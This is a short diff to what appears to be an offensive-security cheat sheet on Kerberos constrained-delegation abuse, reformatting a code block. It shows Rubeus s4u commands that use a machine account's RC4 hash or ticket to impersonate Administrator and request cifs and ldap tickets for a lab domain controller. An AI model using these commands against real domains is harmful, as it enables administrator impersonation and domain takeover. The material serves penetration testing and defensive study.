@@ -774,7 +774,8 @@ Rubeus.exe s4u /user:WEBSRV01$ /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonat
 There is also a possiblity of requesting a TGS for more services than is specified as {msDS-AllowedToDelegateTo} IF there is no SNAME validation:
 
 
-```Rubeus.exe s4u /ticket:adminsrv$_LOCALxxx.kirbi /impersonateuser:Administrator /domain:ecorp.lab /msdsspn:cifs/dc01.ecorp.lab|ldap/dc01.ecorp.lab /dc:dc01.ecorp.lab```
+```
+Rubeus.exe s4u /ticket:adminsrv$_LOCALxxx.kirbi /impersonateuser:Administrator /domain:ecorp.lab /msdsspn:cifs/dc01.ecorp.lab|ldap/dc01.ecorp.lab /dc:dc01.ecorp.lab
 ```
 
 * * * 
